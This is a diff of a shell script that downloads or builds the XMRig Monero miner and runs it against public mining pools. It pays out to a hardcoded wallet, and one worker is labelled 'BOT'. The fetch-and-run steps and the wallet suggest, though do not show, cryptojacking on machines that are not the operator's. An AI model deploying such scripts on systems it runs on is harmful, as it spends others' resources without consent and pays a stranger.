@@ -1,7 +1,4 @@
-sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-sudo apt-get install cmake -y
-git clone https://github.com/xmrig/xmrig.git
-mkdir xmrig/build && cd xmrig/build
-cmake ..
-make -j$(nproc)
-sudo ./xmrig -o pool.hashvault.pro:443 -u 83KVe5m37MhFJQvarfAtS6UkJeqK9vtft1eDrkYU4UmUTrqkm1fbzKyeqK1j4dQt2F1rYuGcdL8z5goEHe93QqNN5tpSCxw -p BOT -k --tls
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-bionic-x64.tar.gz
+tar -zxvf xmrig-6.12.2-bionic-x64.tar.gz
+cd xmrig-6.12.2
+./xmrig --donate-level 1 -o monero.herominers.com:10190 -u 83KVe5m37MhFJQvarfAtS6UkJeqK9vtft1eDrkYU4UmUTrqkm1fbzKyeqK1j4dQt2F1rYuGcdL8z5goEHe93QqNN5tpSCxw -p PEKERJA1 -a rx/0 -k
